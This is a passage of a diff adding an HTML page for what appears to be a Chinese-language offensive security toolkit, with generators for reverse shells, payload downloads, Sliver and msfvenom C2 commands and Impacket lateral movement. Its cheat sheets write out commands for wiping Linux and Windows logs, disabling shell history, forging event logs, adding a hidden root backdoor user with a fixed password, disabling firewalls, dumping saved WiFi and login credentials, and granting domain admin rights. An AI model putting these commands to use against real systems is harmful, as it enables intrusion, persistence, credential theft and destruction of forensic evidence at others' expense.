+                    <p>/proc/net/arp 🎈arp 表，可以获得内网其他机器的地址</p>
+                    <p>/proc/net/route 🎈路由表信息</p>
+                    <p>/proc/net/tcp and /proc/net/udp 🎈 活动连接的信息</p>
+                    <p>/proc/net/fib_trie 🎈 路由缓存</p>
+                    <p>/proc/version 🎈 内核版本</p>
+                    <p>/proc/self/cmdline 当前进程的cmdline参数</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 反弹Shell部分 -->
+            <section id="reverseShell" class="section">
+                <h2>反弹Shell生成器</h2>
+                <div class="shellBox" id="shellCommands">
+                    <form id="shellForm">
+                        <label for="ipAddress">IP 地址:</label>
+                        <input type="text" id="ipAddress" name="ipAddress" placeholder="IP 地址" required>
+                        <label for="port">端口:</label>
+                        <input type="text" id="port" name="port" placeholder="端口" required>
+                        <button type="submit" id="generateButton">生成命令</button>
+                    </form>
+                    <pre id="generatedCommands"></pre>
+                </div>
+            </section>
+
+            <!-- 文件下载部分 -->
+            <section id="fileDownload" class="section">
+                <h2>文件下载方法</h2>
+                <div class="downloadMethods">
+                    <div class="serverSection">
+                        <h3>HTTP Server 启动方式</h3>
+                        <div class="serverOptions">
+                            <button class="copyBtn" data-command="python -m SimpleHTTPServer 8080">Python HTTP</button>
+                            <button class="copyBtn" data-command="python3 -m http.server 8080">Python3 HTTP</button>
+                            <button class="copyBtn" data-command="python -m pyftpdlib -p 8080">Python FTP</button>
+                            <button class="copyBtn" data-command="python3 impacket-smbserver.py files . -port 8080">Python3 SMB</button>
+                            <button class="copyBtn" data-command="php -S 0.0.0.0:8080">PHP 5.4+</button>
+                            <button class="copyBtn" data-command="ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8080, :DocumentRoot => Dir.pwd).start'">Ruby</button>
+                            <button class="copyBtn" data-command="ruby -run -e httpd . -p 8080">Ruby 1.9.2+</button>
+                            <button class="copyBtn" data-command="busybox httpd -f -p 8080">Busybox</button>
+                        </div>
+                    </div>
+
+                    <div class="downloadSection">
+                        <h3>文件下载命令生成</h3>
+                        <form id="downloadForm">
+                            <label for="fileUrl">文件URL:</label>
+                            <input type="text" id="fileUrl" name="fileUrl" placeholder="http://127.0.0.1:8080/file.exe" required>
+                            <label for="filePath">保存路径:</label>
+                            <input type="text" id="filePath" name="filePath" placeholder="C:\path\to\save\file.exe" required>
+                            <label for="downloadType">下载方式:</label>
+                            <select id="downloadType" name="downloadType" required>
+                                <option value="">请选择下载方式</option>
+                                <optgroup label="Windows">
+                                    <option value="powershell_iwr">PowerShell IWR</option>
+                                    <option value="powershell_iex">PowerShell IEX</option>
+                                    <option value="certutil">Certutil</option>
+                                    <option value="bitsadmin">Bitsadmin</option>
+                                    <option value="msiexec">MSIExec</option>
+                                    <option value="odbcconf">Odbcconf</option>
+                                    <option value="certreq">CertReq</option>
+                                    <option value="smb">SMB</option>
+                                    <option value="ipc">IPC$</option>
+                                </optgroup>
+                                <optgroup label="Linux">
+                                    <option value="wget">Wget</option>
+                                    <option value="curl">Curl</option>
+                                    <option value="python">Python</option>
+                                    <option value="whois">Whois</option>
+                                </optgroup>
+                            </select>
+                            <button type="submit" id="generateDownloadButton">生成命令</button>
+                        </form>
+                        <pre id="downloadCommands"></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- C2模块 -->
+            <section id="c2" class="section">
+                <h2>C2 操作</h2>
+                
+                <!-- 添加标签页结构 -->
+                <div class="tabHeader">
+                    <button class="tabButton active" data-target="silverTab">Silver</button>
+                    <button class="tabButton" data-target="msfvenomTab">MSFVenom</button>
+                </div>
+                
+                <!-- Silver标签页 -->
+                <div id="silverTab" class="tabContent active">
+                    <div class="silverGenerator">
+                        <div class="shellBox" id="silverBox">
+                            <form id="silverForm">
+                                <div class="form-group">
+                                    <label for="silverActionType">操作类型:</label>
+                                    <select id="silverActionType" name="silverActionType" required>
+                                        <option value="">请选择操作</option>
+                                        <option value="server">服务端操作</option>
+                                        <option value="client">客户端操作</option>
+                                        <option value="listener">监听器操作</option>
+                                        <option value="generate">木马生成</option>
+                                        <option value="session">会话操作</option>
+                                        <option value="beacon">Beacon操作</option>
+                                    </select>
+                                </div>
+
+                                <div class="form-group silverServerGroup" style="display: none;">
+                                    <label for="silverServerAction">服务端操作:</label>
+                                    <select id="silverServerAction" name="silverServerAction">
+                                        <option value="start">进入远控</option>
+                                        <option value="newOperator">新建Client</option>
+                                        <option value="multiplayer">启用多用户</option>
+                                    </select>
+                                </div>
+
+                                <div class="form-group silverClientGroup" style="display: none;">
+                                    <label for="silverClientAction">客户端操作:</label>
+                                    <select id="silverClientAction" name="silverClientAction">
+                                        <option value="import">导入配置</option>
+                                        <option value="start">启动客户端</option>
+                                    </select>
+                                </div>
+
+                                <div class="form-group silverListenerGroup" style="display: none;">
+                                    <label for="silverListenerType">监听器类型:</label>
+                                    <select id="silverListenerType" name="silverListenerType">
+                                        <option value="http">HTTP</option>
+                                        <option value="https">HTTPS</option>
+                                    </select>
+                                </div>
+
+                                <div class="form-group silverGenerateGroup" style="display: none;">
+                                    <label for="silverTargetOS">目标系统:</label>
+                                    <select id="silverTargetOS" name="silverTargetOS">
+                                        <option value="windows">Windows</option>
+                                        <option value="linux">Linux</option>
+                                        <option value="mac">Mac</option>
+                                    </select>
+                                    <div id="windowsFormat" class="format-options">
+                                        <label for="silverOutputFormat">输出格式:</label>
+                                        <select id="silverOutputFormat" name="silverOutputFormat">
+                                            <option value="exe">EXE</option>
+                                            <option value="shellcode">Shellcode</option>
+                                        </select>
+                                    </div>
+                                    <div id="linuxFormat" class="format-options" style="display: none;">
+                                        <label for="silverLinuxFormat">输出格式:</label>
+                                        <select id="silverLinuxFormat" name="silverLinuxFormat">
+                                            <option value="elf">ELF</option>
+                                            <option value="shellcode">Shellcode</option>
+                                        </select>
+                                    </div>
+                                    <div id="macFormat" class="format-options" style="display: none;">
+                                        <label for="silverMacFormat">输出格式:</label>
+                                        <select id="silverMacFormat" name="silverMacFormat">
+                                            <option value="macho">MACHO</option>
+                                            <option value="shellcode">Shellcode</option>
+                                        </select>
+                                    </div>
+                                </div>
+
+                                <div class="form-group silverBeaconGroup" style="display: none;">
+                                    <label for="silverBeaconFormat">输出格式:</label>
+                                    <select id="silverBeaconFormat" name="silverBeaconFormat">
+                                        <option value="exe">EXE</option>
+                                        <option value="shellcode">Shellcode</option>
+                                    </select>
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="silverLhost">服务器IP:</label>
+                                    <input type="text" id="silverLhost" name="silverLhost" placeholder="192.168.7.130">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="silverLport">端口:</label>
+                                    <input type="text" id="silverLport" name="silverLport" placeholder="7999">
+                                </div>
+
+                                <div class="form-group silverOperatorGroup" style="display: none;">
+                                    <label for="silverOperatorName">操作员名称:</label>
+                                    <input type="text" id="silverOperatorName" name="silverOperatorName" placeholder="24">
+                                </div>
+
+                                <div class="form-group silverConfigGroup" style="display: none;">
+                                    <label for="silverConfigFile">配置文件:</label>
+                                    <input type="text" id="silverConfigFile" name="silverConfigFile" placeholder="test_192.168.0.253.cfg">
+                                </div>
+
+                                <div class="form-group silverSessionGroup" style="display: none;">
+                                    <label for="silverSessionID">会话ID:</label>
+                                    <input type="text" id="silverSessionID" name="silverSessionID" placeholder="4db33d09">
+                                    <div class="session-actions">
+                                        <label>
+                                            <input type="radio" name="sessionAction" value="kill" checked> 结束会话
+                                        </label>
+                                        <label>
+                                            <input type="radio" name="sessionAction" value="interact"> 进入会话
+                                        </label>
+                                    </div>
+                                </div>
+
+                                <div class="form-group silverBeaconOptionsGroup" style="display: none;">
+                                    <label for="silverBeaconSeconds">Beacon间隔(秒):</label>
+                                    <input type="text" id="silverBeaconSeconds" name="silverBeaconSeconds" placeholder="5">
+                                    <label for="silverBeaconJitter">抖动值:</label>
+                                    <input type="text" id="silverBeaconJitter" name="silverBeaconJitter" placeholder="3">
+                                </div>
+
+                                <button type="submit" id="generateSilverButton">生成命令</button>
+                            </form>
+                            <pre id="silverOutput" class="command-output" readonly placeholder="生成的命令将显示在这里..."></pre>
+                        </div>
+                        <div class="note">
+                            <h3>Silver 使用说明</h3>
+                            <p>1. 选择要执行的操作类型</p>
+                            <p>2. 根据操作类型填写相应的参数</p>
+                            <p>3. 点击生成按钮获取命令</p>
+                            <p>4. 服务端操作需要在服务器上执行</p>
+                            <p>5. 客户端操作需要在本地执行</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- MSFVenom标签页 -->
+                <div id="msfvenomTab" class="tabContent">
+                <div class="msfvenomGenerator">
+                    <div class="shellBox" id="msfvenomBox">
+                        <form id="msfvenomForm">
+                            <div class="form-group">
+                                <label for="payloadCategory">Payload 类别:</label>
+                                <select id="payloadCategory" name="payloadCategory" required>
+                                    <option value="">请选择 Payload 类别</option>
+                                    <option value="payload">Payload</option>
+                                    <option value="shellcode">Shellcode</option>
+                                    <option value="webshell">Web Shell</option>
+                                    <option value="script">脚本语言</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="payloadPlatform">目标平台:</label>
+                                <select id="payloadPlatform" name="payloadPlatform" required>
+                                    <option value="">请选择目标平台</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="architecture">系统架构:</label>
+                                <select id="architecture" name="architecture" required>
+                                    <option value="">请选择系统架构</option>
+                                    <option value="x64">x64 (64位)</option>
+                                    <option value="x86">x86 (32位)</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="lhost">LHOST (攻击者 IP):</label>
+                                <input type="text" id="lhost" name="lhost" placeholder="攻击者 IP" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="lport">LPORT (监听端口):</label>
+                                <input type="text" id="lport" name="lport" placeholder="监听端口" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="outputFile">输出文件名:</label>
+                                <input type="text" id="outputFile" name="outputFile" placeholder="输出文件名" required>
+                            </div>
+                            
+                            <button type="submit" id="generateMsfvenomButton">生成命令</button>
+                        </form>
+                        <pre id="msfvenomOutput" class="command-output" readonly placeholder="生成的命令将显示在这里..."></pre>
+                        <pre id="msfListenerOutput" class="command-output" readonly placeholder="MSF监听设置将显示在这里..."></pre>
+                    </div>
+                    <div class="note">
+                        <h3>使用说明</h3>
+                        <p>1. 选择 Payload 类别和目标平台</p>
+                        <p>2. 填写攻击者IP和监听端口</p>
+                        <p>3. 指定输出文件名（包含适当的扩展名）</p>
+                        <p>4. 点击生成按钮获取完整命令</p>
+                        <p>5. 复制生成的命令到终端执行</p>
+                        <p>6. 使用生成的MSF监听设置启动监听器</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+                  <!-- 痕迹清理部分 -->
+                  <section id="traceClean" class="section">
+                    <h2>痕迹清理</h2>
+                    <div class="traceCleanGenerator">
+                        <div class="tabHeader">
+                            <button class="tabButton active" data-target="linuxTraceTab">Linux</button>
+                            <button class="tabButton" data-target="windowsTraceTab">Windows</button>
+                        </div>
+                        
+                        <!-- Linux痕迹清理Tab -->
+                        <div id="linuxTraceTab" class="tabContent active">
+                        <h3>Linux 本次不记录命令(完全不记录)</h3>
+                        <pre>
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+                        </pre>
+    
+                        <h3>Linux 常用日志全清</h3>
+                        <pre>
+echo > /var/log/btmp;echo > /var/log/wtmp;echo > /var/log/lastlog;echo > /var/log/utmp;cat /dev/null > /var/log/secure;cat /dev/null > /var/log/message;echo ok
+                        </pre>
+    
+                        <h3>Linux 清除 Web 日志</h3>
+                        <pre>
+💦直接替换日志ip地址:
+sed -i 's/10.10.10.10/192.168.1.1/g' access.log
+    
+💦清除部分相关日志:
+💦使用grep -v来把相关信息删除:
+cat /var/log/nginx/access.log | grep -v evil.php > tmp.log
+    
+💦把修改过的日志覆盖到原日志文件:
+cat tmp.log > /var/log/nginx/access.log/
+                        </pre>
+    
+                        <h3>隐身登录系统, 不会被 w、who、last 等指令检测到</h3>
+                        <pre>
+ssh -T root@10.10.10.10 /bin/bash -i
+                        </pre>
+    
+                        <h3>不记录 SSH 公钥在本地 .ssh 目录中</h3>
+                        <pre>
+ssh -o UserKnownHostsFile=/dev/null -T root@10.10.10.10 /bin/bash -i
+                        </pre>
+    
+                        <h3>Linux 文件安全删除</h3>
+                        <pre>
+💦shred 命令擦除数据, 默认覆盖3次, 通过 -n 指定数据覆盖次数:
+shred -f -u -z -v -n 8 <要删除的文件>
+    
+💦dd 命令:
+dd if=/dev/zero of=<要删除的文件> bs=<大小> count=<写入的次数>
+    
+💦wipe 命令:
+wipe <要删除的文件>
+                        </pre>
+    
+                        <h3>Linux 清除 history 记录文件</h3>
+                        <pre>
+vim ~/.bash_history
+💦删除不想要的部分, dd 删除一整行
+Esc, 输入 :wq, 回车
+                        </pre>
+    
+                        <h3>Linux 清除当前用户的 history 命令记录</h3>
+                        <pre>
+history -c
+                        </pre>
+    
+                        <h3>Linux 本次不记录命令(记录第一行)</h3>
+                        <pre>
+set +o history
+                        </pre>
+    
+                        <h3>Linux 清空特定日志文件</h3>
+                        <pre>
+💦清除登录系统失败的记录:
+echo > /var/log/btmp
+    
+💦清除登录系统成功的记录:
+echo > /var/log/wtmp
+    
+💦清除用户最后一次登录时间:
+echo > /var/log/lastlog
+    
+💦 清除当前登录用户的信息:
+echo > /var/log/utmp
+    
+💦清除安全日志记录:
+cat /dev/null > /var/log/secure
+    
+💦清除系统日志记录:
+cat /dev/null > /var/log/message
+                        </pre>
+    
+                        <h3>Linux 删除/替换特定日志信息</h3>
+                        <pre>
+💦删除所有匹配到字符串的行, 比如以当天日期或者自己的登录 ip:
+sed -i '/10.10.10.10/d' /var/log/messages
+    
+💦全局替换登录 IP 地址:
+sed -i 's/10.10.10.10/192.168.1.1/g' secure
+                        </pre>
+                        </div>
+    
+                        <!-- Windows痕迹清理Tab -->
+                        <div id="windowsTraceTab" class="tabContent">
+                            <h3>Windows 使用 MSF 一键清理</h3>
+                        <pre>
+meterpreter> run event_manager -c
+                            </pre>
+
+                            <h3>Windows 事件日志全清</h3>
+                            <pre>
+PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}" & PowerShell -Command "Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}"
+                            </pre>
+
+                            <h3>Windows IIS 日志全清</h3>
+                            <pre>
+💦停止服务:
+net stop w3svc
+
+💦删除日志目录下所有文件:
+del *.*
+
+💦重新启用服务:
+net start w3svc
+
+💦IIS日志存放地址:
+Windows Server 2003 iis 6日志路径:
+C:\\Windows\\System32\\LogFiles
+
+💦Windows Server 2008 R2、2012、2016、2019 iis7以上日志路径:
+C:\\inetpub\\logs\\LogFiles
+
+💦由于每个网站，iis 都会自动生成一个保存日志的文件夹，所以具体 iis日志位置在 LogFiles 文件夹中的一个子文件夹里,例如:
+C:\\Windows\\System32\\LogFiles\\W3SVC2
+C:\\inetpub\\logs\\LogFiles\\W3SVC1
+                            </pre>
+
+                            <h3>Windows 远程桌面记录全清</h3>
+                            <pre>
+reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server ClientDefault" /va /f & reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers" /f & reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers" & del /ah %homepath%\\documents\\default.rdp
+                            </pre>
+
+                            <h3>Windows 文件安全删除</h3>
+                            <pre>
+💦Cipher 命令多次覆写:
+cipher /w:D:\\文件名
+
+💦Format 命令覆盖格式化:
+format D: /P:8
+                            </pre>
+
+                            <h3>Tips:</h3>
+                            <pre>
+💦在删除文件后, 可以利用 Cipher 命令通过 /W 参数可反复写入其他数据覆盖已删除文件的硬盘空间, 彻底删除数据防止被恢复.
+💦Format 命令加上 /P 参数后, 就会把每个扇区先清零, 再用随机数覆盖. 而且可以覆盖多次, 上述这条命令表示把 D 盘用随机数覆盖 8 次.
+                            </pre>
+
+                            <h3>Windows 日志伪造</h3>
+                            <pre>
+eventcreate -l system -so administrator -t warning -d "this is a test" -id 500
+                        </pre>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 内网信息收集部分 -->
+                <section id="systemInfo" class="section">
+                    <h2>内网信息收集</h2>
+                    <div class="infoCollectionTabs">
+                        <div class="tabHeader">
+                            <button class="tabButton active" data-target="linuxTab">Linux</button>
+                            <button class="tabButton" data-target="windowsTab">Windows</button>
+                        </div>
+                        
+                        <!-- Linux信息收集Tab -->
+                        <div id="linuxTab" class="tabContent active">
+                            <h3>一、系统基本信息</h3>
+                            <pre>
+💦 系统信息概览:
+uname -a
+
+💦 内核版本:
+uname -r
+
+💦 系统主机名:
+uname -n
+hostname
+
+💦 系统架构:
+uname -m
+
+💦 系统版本信息:
+cat /proc/version
+
+💦 CPU信息:
+cat /proc/cpuinfo
+
+💦 文件系统信息:
+df -a
+                            </pre>
+
+                            <h3>二、用户和组信息</h3>
+                            <pre>
+💦 系统用户列表:
+cat /etc/passwd
+
+💦 系统组列表:
+cat /etc/group
+
+💦 用户密码哈希(需要root):
+cat /etc/shadow
+
+💦 当前登录用户:
+users
+who -a
+w
+
+💦 登录历史:
+last
+lastlog
+                            </pre>
+
+                            <h3>三、用户权限信息</h3>
+                            <pre>
+💦 当前用户信息:
+whoami
+id
+
+💦 Sudo权限信息:
+cat /etc/sudoers
+sudo -l
+
+💦 用户切换:
+su
+
+💦 添加root后门用户:
+useradd -p `openssl passwd -1 -salt 'salt' QWEqwe123` get -o -u 0 -g root -G root -s /bin/bash -d /home/test
+                            </pre>
+
+                            <h3>四、环境信息</h3>
+                            <pre>
+💦 环境变量:
+env
+set
+echo $PATH
+
+💦 历史命令:
+history
+cat /root/.bash_history
+history -c
+rm -rf /root/.bash_history
+
+💦 系统配置:
+pwd
+cat /etc/profile
+cat /etc/shells
+                            </pre>
+
+                            <h3>五、服务信息</h3>
+                            <pre>
+💦 进程信息:
+ps aux
+
+💦 服务配置:
+cat /etc/inetd.conf
+cat /etc/xinetd.conf
+cat /etc/exports
+                            </pre>
+
+                            <h3>六、网络信息</h3>
+                            <pre>
+💦 网络接口:
+/sbin/ifconfig -a
+ip a
+
+💦 ARP表:
+arp -a
+cat /proc/net/arp
+
+💦 路由信息:
+route
+
+💦 DNS配置:
+cat /etc/resolv.conf
+
+💦 端口信息:
+netstat -an
+netstat -tulnp
+
+💦 防火墙配置:
+iptables -L
+cat /etc/services
+
+💦 网络配置:
+hostname -i
+cat /etc/hosts
+cat /proc/net/dev
+
+💦 防火墙管理:
+systemctl stop firewalld.service
+systemctl disable firewalld.service
+firewall-cmd --zone=public --add-port=8080/tcp --permanent
+iptables -F
+sed -i 's/enforcing/disabled/' /etc/selinux/config
+sed -ri 's/.*swap.*/#&/' /etc/fstab
+                            </pre>
+
+                            <h3>七、软件信息</h3>
+                            <pre>
+💦 已安装软件:
+dpkg -l    # Debian
+rpm -qa    # Red Hat
+
+💦 版本信息:
+sudo -V
+httpd -v
+apache2 -v
+apache2ctl -M
+mysql --version
+psql -V
+perl -v
+java -version
+python --version
+ruby -v
+
+💦 软件查找:
+find / -name %program_name%
+which %program_name%
+cat /etc/apache2/envvars
+                            </pre>
+
+                            <h3>八、文件查找</h3>
+                            <pre>
+💦 通用查找:
+find / -name *.conf
+whereis ifconfig
+which ifconfig
+grep -rn move.lab /etc
+grep -rn move.lab /var/www/html
+
+💦 权限相关查找:
+find / -perm -4000 -type f
+find / -uid 0 -perm -4000 -type f
+find / -perm -2 -type f
+find / ! -path "/proc/" -perm -2 -type f -print
+find / -perm -2 -type d
+find /home –name *.rhosts -print
+
+💦 历史记录:
+cat ~/.bash_history
+ls -la ~/.*_history
+ls -la ~/.ssh/
+                            </pre>
+
+                            <h3>九、数据库信息</h3>
+                            <pre>
+💦 Redis配置:
+cat /etc/redis/redis.conf
+find / -name redis
+
+💦 PostgreSQL信息:
+printenv PGUSER PGPASSWORD
+printenv
+                            </pre>
+
+                            <h3>十、其他实用命令</h3>
+                            <pre>
+💦 开启ICMP通信:
+sudo sysctl -w net.ipv4.ping_group_range="0 2147483647"
+
+💦 容器检测:
+cat /proc/1/cgroup
+
+💦 域信息:
+cat /etc/krb5.conf
+                            </pre>
+                        </div>
+                        
+                        <!-- Windows信息收集Tab -->
+                        <div id="windowsTab" class="tabContent">
+                            <h3>一、工作组环境</h3>
+                            <pre>
+💦 网络配置信息:
+ipconfig /all
+
+💦 用户列表与信息:
+net user                         # 查看本机用户列表
+net localgroup administrators    # 本机管理员（通常有域用户）
+query user || qwinsta            # 查看当前在线用户
+whoami                           # 查询当前权限
+whoami /all                      # 获取SID
+net user &lt;username&gt;             # 查询指定账户的详细信息
+
+💦 系统信息:
+systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"  # 中文版
+systeminfo | findstr /B /C:"OS NAME" /C:"OS VERSION"  # 英文版
+systeminfo                       # 完整系统信息
+wmic product get name,version    # 安装的软件及版本、路径
+wmic qfe                         # 查看补丁信息
+net config Workstation           # 查看计算机名、全名、用户名、系统版本等
+net accounts                     # 查看本机的密码策略
+
+💦 进程与服务:
+tasklist /v                      # 查询进程列表
+wmic startup                     # 查看启动项
+wmic service                     # 查看服务
+net start                        # 查看开启了哪些服务
+tskill &lt;PID&gt;                     # 终止进程
+
+💦 网络连接:
+netstat -ano                     # 查询端口列表
+arp -a                           # 查看ARP缓存表
+route print                      # 打印路由表
+net share                        # 查询本机共享
+net use                          # 查看IPC连接状态
+
+💦 防火墙配置:
+netsh firewall show config       # 查询防火墙配置
+netsh firewall set opmode disable  # 关闭防火墙 (2003及之前)
+netsh advfirewall set allprofiles state off  # 关闭防火墙 (2003之后)
+netsh firewall add portopening protocol = TCP port = 3389 name = rdp  # 防火墙放行
+
+💦 远程桌面配置:
+REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections  # 查看是否开启
+REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber  # 查看端口
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  # 开启3389端口
+wmic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1  # Win2003开启3389
+
+💦 系统配置:
+set                              # 查看本机环境变量
+fsutil fsinfo drives             # 查看盘符
+wmic MemoryChip get Capacity,Speed  # 查看内存信息
+wmic cpu get name,CurrentClockSpeed,MaxClockSpeed  # 查看CPU信息
+wmic logicaldisk get size,freespace,caption  # 查看磁盘大小
+wmic path win32_videocontroller get name  # 查看显卡信息
+gpupdate /force                  # 更新组策略
+
+💦 探测与发现:
+for /L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="  # 内网存活探测
+
+💦 凭证信息:
+netsh wlan show profiles         # 查看连接过的WiFi名称
+netsh wlan show profile name="WiFi名称" key=clear  # 查看WiFi密码     
+dir /a %userprofile%\AppData\Local\Microsoft\Credentials*  # 查看RDP连接凭证
+dir %APPDATA%\Microsoft\Windows\Recent  # 查看最近打开的文档
+cmdkey /l                        # 查看当前保存的登录凭证
+
+💦 文件查找:
+chdir                            # 查看当前目录
+dir                              # 查看当前目录下的文件
+dir /s/b E:\*.php                # 根据条件查找文件
+dir /a /s /b c:\*.conf *.ini *.inc *.config  # 查找配置文件
+dir /a /s /b c:\*.txt *.xls *.xlsx *.docx | findstr "密码"  # 查找包含关键字的文件
+
+💦 用户管理:
+net user username password /add  # 添加普通用户
+net localgroup administrators username /add  # 将用户添加到管理员组
+net localgroup "Remote Desktop Users" username /add  # 将用户添加到远程桌面组
+net user username /expires:never  # 设置账户永不过期
+wmic UserAccount where Name='username' set PasswordExpires=False  # 设置密码永不过期
+
+💦 其他实用信息:
+reg query HKEY_CURRENT_USER\Software\Mobatek\MobaXterm  # 抓取MobaXterm信息
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f  # 禁用系统还原
+                            </pre>
+
+                            <h3>二、域环境</h3>
+                            <pre>
+💦 域环境识别:
+ipconfig /all                    # 查看主DNS后缀判断是否有域
+
+💦 域用户与组信息:
+net user /domain                 # 查询所有域用户
+net group /domain                # 查询域内所有用户组列表
+net group "domain computers" /domain  # 查询所有域成员计算机列表
+net group "domain admins" /domain  # 查询域内所有管理员
+net group "enterprise admins" /domain  # 查询域内所有企业管理员
+wmic useraccount get /all        # 获取域内用户详细信息
+net localgroup administrators /domain  # 登录本机的域管理员
+net group "domain admins" /domain  # 同上
+
+💦 域控制器信息:
+nltest /DCLIST:domainname.com    # 查询域控制器机器名
+nslookup -type=SRV _ldap._tcp    # 查看域控制器的主机名和IP地址
+net group "Domain Controllers" /domain  # 查看域控制器组
+
+💦 域信任关系:
+nltest /domain_trusts            # 域信任列表
+nltest /domain_trusts /PRIMARY   # 仅返回计算机账户属于的域
+nltest /domain_trusts /FOREST    # 仅返回主域同一森林下的域
+nltest /domain_trusts /DIRECT_OUT  # 返回被主域明确信任的域
+nltest /domain_trusts /DIRECT_IN   # 返回明确信任主域的域
+nltest /domain_trusts /ALL_TRUSTS  # 返回所有已信任的域
+nltest /domain_trusts /V           # 显示详细输出
+netdom query trust               # 获取子域名称
+
+💦 域查询命令:
+net time /domain                 # 查询主域
+net config workstation           # 查询登录的当前域
+nslookup –qt-MX domainname.com   # 查询邮件服务器
+setspn -Q */* | findstr "CN="    # 根据SPN查询域内机器
+
+💦 dsquery常用命令:
+dsquery computer                 # 在目录中查询计算机列表
+dsquery group                    # 在目录中查询组
+dsquery site                     # 在目录中查询网站
+dsquery server                   # 在目录中查询域控制器
+dsquery user                     # 在目录中查询域用户
+
+💦 域内用户管理:
+net user username password /add  # 添加普通用户
+net group "domain admins" username /add  # 把普通用户添加到域管理员用户组
+net group "enterprise admins" username /add  # 把普通用户添加到企业管理员用户组
+net localgroup "Remote Desktop Users" username /add  # 添加远程桌面组
+
+💦 用户切换:
+runas /user:user@domain cmd      # 终端切换到域用户
+                            </pre>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 内网横向移动部分 -->
+                <section id="lateralMovement" class="section">
+                    <h2>内网横向移动</h2>
+                    <div class="lateralMovementTabs">
+                        <div class="tabHeader">
+                            <button class="tabButton active" data-target="impacketTab">Impacket</button>
+                            <button class="tabButton" data-target="cmeTab">CME</button>
+                            <button class="tabButton" data-target="nxcTab">NXC</button>
+                        </div>
+                        
+                        <!-- Impacket Tab -->
+                        <div id="impacketTab" class="tabContent active">
+                            <form id="impacketForm">
+                                <div class="form-group">
+                                    <label for="impacketActionType">操作类型:</label>
+                                    <select id="impacketActionType" name="impacketActionType" required>
+                                        <option value="">请选择操作</option>
+                                        <option value="execCommand">执行命令</option>
+                                        <option value="interactiveShell">交互式Shell</option>
+                                        <option value="dumpCredentials">凭据转储</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="impacketTool">选择工具:</label>
+                                    <select id="impacketTool" name="impacketTool" required>
+                                        <option value="">请选择工具</option>
+                                        <option value="wmiexec">wmiexec</option>
+                                        <option value="wmiexec-pro">wmiexec-pro</option>
+                                        <option value="psexec">psexec</option>
+                                        <option value="smbexec">smbexec</option>
+                                        <option value="atexec">atexec</option>
+                                        <option value="atexec-pro">atexec-pro</option>
+                                        <option value="dcomexec">dcomexec</option>
+                                        <option value="secretsdump">secretsdump</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="impacketIP">IP地址:</label>
+                                    <input type="text" id="impacketIP" name="impacketIP" placeholder="10.10.10.5" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="impacketUsername">用户名:</label>
+                                    <input type="text" id="impacketUsername" name="impacketUsername" placeholder="administrator" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="impacketPassword">密码:</label>
+                                    <input type="text" id="impacketPassword" name="impacketPassword" placeholder="password">
+                                </div>
+                                <div class="form-group">
+                                    <label for="impacketHash">Hash(可选):</label>
+                                    <input type="text" id="impacketHash" name="impacketHash" placeholder="LM:NT">
+                                </div>
+                                <div class="form-group">
+                                    <label for="impacketDomain">域名称(可选):</label>
+                                    <input type="text" id="impacketDomain" name="impacketDomain" placeholder="24team">
+                                </div>
+                                
+                                <div class="form-group impacketCommandGroup">
+                                    <label for="impacketCommand">命令:</label>
+                                    <input type="text" id="impacketCommand" name="impacketCommand" placeholder="ipconfig">
+                                </div>
+                                
+                                <div class="form-group impacketShellGroup" style="display: none;">
+                                    <label for="impacketShellType">交互式shell:</label>
+                                    <select id="impacketShellType" name="impacketShellType">
+                                        <option value="">请选择Shell类型</option>
+                                        <option value="cmd">CMD</option>
+                                        <option value="powershell">PowerShell</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group" id="withOutputGroup" style="display: none;">
+                                    <label>命令输出:</label>
+                                    <div style="display: flex; gap: 10px;">
+                                        <input type="checkbox" id="withOutput" name="withOutput" style="width: auto;">
+                                        <label for="withOutput" style="margin: 0;">显示命令输出</label>
+                                    </div>
+                                </div>
+                                
+                                <button type="submit" id="generateImpacketButton">生成命令</button>
+                            </form>
+                            <pre id="impacketOutput" class="command-output" readonly placeholder="生成的命令将显示在这里..."></pre>
+                        </div>
+                        
+                        <!-- CME Tab -->
+                        <div id="cmeTab" class="tabContent">
+                            <form id="cmeForm">
+                                <div class="form-group">
+                                    <label for="cmeActionType">操作类型:</label>
